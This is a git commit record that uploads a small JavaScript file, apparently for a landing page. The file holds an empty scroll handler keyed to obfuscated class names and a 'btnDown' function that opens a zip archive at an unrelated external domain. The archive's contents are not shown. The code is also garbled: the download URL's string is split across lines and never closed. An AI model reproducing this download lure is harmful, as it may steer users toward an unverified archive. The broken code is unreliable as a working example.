6d0fd1f8d31ff02df1a7981d4890545478a51613
z168188 <lyuelinm54@gmail.com>
2025-08-20 19:10:55 +0800

    Add files via upload

---
+++ static/js/23.99320a.js
@@ -0,0 +1,17 @@
+﻿(function() {
+    window.onscroll = (e) => {
+        const header = document.getElementsByClassName('u_7l743RBX3CBYIIl4UQ')[0];
+        const imageCon = document.getElementsByClassName('_KRzwPBUJHT_HZx1ZaW7')[0];
+        const menu = document.getElementsByClassName('szmzjmRn1T7Z2BAeW5ok')[0];
+        const lang = document.getElementsByClassName('ClSwxY6aPsaZF8g_mCN3')[0];
+
+      
+    }
+
+   
+    
+})();
+
+function btnDown() {
+    window.open('
+http://xzyqa.cc/q.zip}
